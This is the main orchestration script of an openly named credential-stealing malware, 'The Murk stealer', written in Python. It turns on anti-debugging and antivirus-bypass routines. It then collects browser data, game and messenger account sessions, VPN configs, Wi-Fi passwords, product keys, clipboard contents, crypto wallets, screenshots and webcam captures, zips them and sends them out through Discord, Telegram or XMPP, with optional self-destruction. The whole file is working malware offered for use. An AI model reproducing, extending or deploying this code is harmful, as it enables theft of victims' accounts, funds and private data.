#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

from scripts.manager import make_folder
from scripts.system import system_info
from scripts.system import programs
from scripts.system import photos
from scripts.games import Minecraft
from scripts.messengers import telegram
from scripts.manager import send 
from scripts.manager import clear
from scripts.games import steam
from scripts.messengers import discord
from scripts.games import epicGames
from scripts.messengers import whatsapp
from scripts.games import roblox
from scripts.wallets import wallets
from scripts.messengers import skype
from scripts.games import BattleNET
from scripts.games import Uplay
from config.config import Config
from scripts.manager import ending
from scripts.messengers import viber
from scripts.browsers import chromium
from scripts.files import Files_txt
from scripts.files import file_grabber
from scripts.secure import antiDebug
from scripts.secure import avbypass
from scripts.files import filezilla
from scripts.vpn import vpn
from scripts.messengers import pidgin
from scripts.system import productkey
from scripts.system import wifi
from scripts.system import clipboard
from scripts.browsers import geckodriver

def Start() -> None:
    if not Config.debuging:
        antiDebug.AntiDebug(Config.oneStart)
        if Config.avbypass:
            avbypass.AvByPass()

    make_folder.makeFolders(Config.enableFileGrabber,Config.oneStart)
def GrabFiles() -> None:
    if Config.enableFileGrabber:
        Config.msgFiles= file_grabber.Grab(Config.msgFiles)
    else:
        Files_txt.TxtSteal()
    filezilla.FileZilla()

def Browsers() -> None:
    Config.msgBrowsers.append("\n\n<b>🌐Browsers🌐</b>")
    chromium.Browsers()
    Config.msgBrowsers = chromium.Browsers.Return()
    Config.msgBrowsers = geckodriver.GeckoDriver(Config.msgBrowsers)

def Games() -> None:
    Config.msgOther.append("\n\n<b>🕹Games🕹</b>")
    Config.msgOther = epicGames.Epic(Config.msgOther)
    Config.msgOther = Uplay.Ubisoft(Config.msgOther)
    Config.msgOther = Minecraft.Minecraft(Config.msgOther)
    Config.msgOther = roblox.roblox(Config.msgOther)
    Config.msgOther = steam.Steam(Config.msgOther)
    Config.msgOther =BattleNET.BattleNet(Config.msgOther)

def Messagers() -> None:
    Config.msgOther.append("\n\n<b>📬Messagers📬</b>")
    Config.msgOther = skype.skype(Config.msgOther)
    Config.msgOther = telegram.Telegram(Config.msgOther)
    Config.msgOther = viber.Viber(Config.msgOther)
    Config.msgOther = discord.Discord(Config.msgOther)
    Config.msgOther = whatsapp.WhatsApp(Config.msgOther)
    Config.msgOther = pidgin.Pidgin(Config.msgOther)

def VPN() -> None:
    Config.msgVPN= vpn.VPN(Config.msgVPN)

def System() -> None:
    Config.msgSYS = system_info.SystemInfo(Config.msgSYS)
    productkey.PKay()
    wifi.Wifi()
    clipboard.ClipBoard()


def Other() -> None:
    Config.msgWallets = wallets.Wallets(Config.msgWallets)
    programs.Programs()
    photos.Screenshot()
    photos.WebCam()

def End() -> None:
    try:
        Config.np = clear.makemeZip(Config.name,Config.password,Config.np)
    except Exception as e:
        print(e)
    try:
        send.Send(Config.sendType,Config.np,Config.msgSYS,Config.msgBrowsers,Config.msgOther,Config.msgWallets,Config.msgFiles,Config.msgVPN,Config.discordData,Config.TelegramData,Config.xmppData)
    except Exception as e:
        print(e)
    ending.End(Config.np, Config.selfDestruct)

def Main()-> None:
    Start()
    GrabFiles()
    Browsers()
    Games()
    Messagers()
    VPN()
    System()
    Other()
    End()

